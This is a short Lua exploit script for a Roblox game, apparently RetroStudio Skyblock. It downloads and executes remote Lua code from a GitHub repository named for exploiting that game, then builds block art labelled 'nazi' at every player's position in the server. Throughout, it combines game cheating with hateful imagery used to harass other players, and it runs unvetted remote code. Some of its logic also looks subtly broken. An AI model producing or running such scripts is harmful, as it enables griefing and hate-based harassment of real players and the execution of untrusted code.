local word = "nazi"

local head = 'https://raw.githubusercontent.com/'
local github = 'RetroStudioExploit/'

local suffix = '/refs/heads/main/'
local API = loadstring(game:HttpGet(head .. github .. 'RetroScripts' .. suffix .. 'retrostudio/Skyblock/SkyblockApi.lua'))()
local ARTS = loadstring(game:HttpGet(head .. github .. 'RetroScripts' .. suffix .. 'Globals/CframeArts.lua'))()

local PS = game:GetService("Players")
local BlockStorage = game:GetService("Lighting").Blocks:GetChildren()

local choosenBlock = BlockStorage[math.random(0, #BlockStorage)]

function getRoot(char):Part
	return char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
end

for _, player in PS:GetPlayers() do
	for _, v in pairs(ARTS[word]) do
        if not player:FindFirstChild("Character") then continue end

		local chr = getRoot(player.Character)
		if chr == nil then continue end

        API.Build(v.X + chr.Position.X, v.Y + chr.Position.Y, chr.Position.Z, choosenBlock, workspace)
	end
end